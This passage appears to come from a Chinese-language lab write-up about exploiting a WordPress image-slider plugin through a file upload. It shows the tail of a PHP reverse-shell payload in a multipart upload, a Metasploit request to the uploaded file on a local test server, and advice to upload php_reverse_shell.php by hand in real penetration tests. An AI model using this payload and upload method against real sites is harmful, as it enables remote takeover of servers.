class="o">(</span><span class="nv">$pipes</span><span class="o">[</span><span class="m">1</span><span class="o">])){</span>  <span class="nv">$o</span>.<span class="o">=</span>fread<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span><span class="m">1</span><span class="o">]</span>,1024<span class="o">)</span><span class="p">;</span>  <span class="o">}</span>  @proc_close<span class="o">(</span><span class="nv">$handle</span><span class="o">)</span><span class="p">;</span>  <span class="o">}</span><span class="k">else</span>  <span class="o">{</span>  <span class="nv">$o</span><span class="o">=</span><span class="m">0</span><span class="p">;</span>  <span class="o">}</span>    <span class="o">}</span>  @socket_write<span class="o">(</span><span class="nv">$msgsock</span>,<span class="nv">$o</span>,strlen<span class="o">(</span><span class="nv">$o</span><span class="o">))</span><span class="p">;</span>  <span class="o">}</span>  @socket_close<span class="o">(</span><span class="nv">$msgsock</span><span class="o">)</span><span class="p">;</span>  ?&gt;
-----------------------------743289811480519521793446209521
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"imagetitle"</span>

KSXrN
-----------------------------743289811480519521793446209521
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"btnsave"</span>

Save Changes
-----------------------------743289811480519521793446209521--
</pre></div>
<p>接下来模块访问了/wp-content/uploads/wp-responsive-images-thumbnail-slider/0c2a53f9bbc963addd5de93663f4a35d.php</p>
<div class="highlight"><pre><span></span>GET /wp-content/uploads/wp-responsive-images-thumbnail-slider/0c2a53f9bbc963addd5de93663f4a35d.php HTTP/1.1
Host: <span class="m">127</span>.0.0.1:81
User-Agent: Mozilla/5.0 <span class="o">(</span>Macintosh<span class="p">;</span> Intel Mac OS X <span class="m">14</span>.0<span class="p">;</span> rv:109.0<span class="o">)</span> Gecko/20100101 Firefox/118.0
Cookie: <span class="nv">wordpress_test_cookie</span><span class="o">=</span>WP+Cookie+check<span class="p">;</span> <span class="nv">wordpress_6c4a121fd069bf4e2556e12b7efdd957</span><span class="o">=</span>may%7C1706103384%7Cui79L7HaD6Tg7KSz4Klp4rrYC5nGMuTiSyjaHFqiA8A%7Cc6f4177388dc93f4dbf79d2e82f47164644463acddf110de7c2abfbe1c97e5d7<span class="p">;</span> <span class="nv">wordpress_6c4a121fd069bf4e2556e12b7efdd957</span><span class="o">=</span>may%7C1706103384%7Cui79L7HaD6Tg7KSz4Klp4rrYC5nGMuTiSyjaHFqiA8A%7Cc6f4177388dc93f4dbf79d2e82f47164644463acddf110de7c2abfbe1c97e5d7<span class="p">;</span> <span class="nv">wordpress_logged_in_6c4a121fd069bf4e2556e12b7efdd957</span><span class="o">=</span>may%7C1706103384%7Cui79L7HaD6Tg7KSz4Klp4rrYC5nGMuTiSyjaHFqiA8A%7C813c527b5d99bb083c2e43068cc63c66c41836fc5d3fc42883b8390f8da744a2<span class="p">;</span>
</pre></div>
<p>但我们到/wp-content/uploads/wp-responsive-images-thumbnail-slider/发现文件名与模块访问的文件不一致<br/>
导致响应404 msf自然就没有接收到shell<br/>
猜测这是wordpress版本差异 文件的命名方式有所不同导致的问题<br/>
在实际渗透中 可以通过插件漏洞手动上传php_reverse_shell.php 然后进行访问反弹shell</p>
</div>
</div>